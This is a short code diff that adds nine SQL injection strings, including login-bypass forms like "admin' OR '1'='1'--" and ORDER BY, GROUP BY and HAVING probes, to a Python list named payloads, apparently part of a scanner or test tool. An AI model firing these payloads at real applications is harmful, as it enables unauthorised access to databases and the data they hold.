@@ -51,6 +51,15 @@ payloads = [
     "\" OR SLEEP(5) -- ",
     "' OR (SELECT 1 FROM dual WHERE EXISTS(SELECT * FROM users)) -- ",
     "' AND (SELECT SUBSTRING(@@version,1,1)) = '5' -- ",
+    "admin' OR '1'='1'--",
+    "admin')--",
+    "' OR ''='",
+    "' OR '1'='1' /*",
+    "' OR 1=1 ORDER BY 1--",
+    "' OR 1=1 ORDER BY 100--",
+    "' OR 1=1 ORDER BY 1,2,3--",
+    "' OR 1=1 GROUP BY column_names_here--",
+    "' OR 1=1 HAVING 1=1--",
 ]
 
 
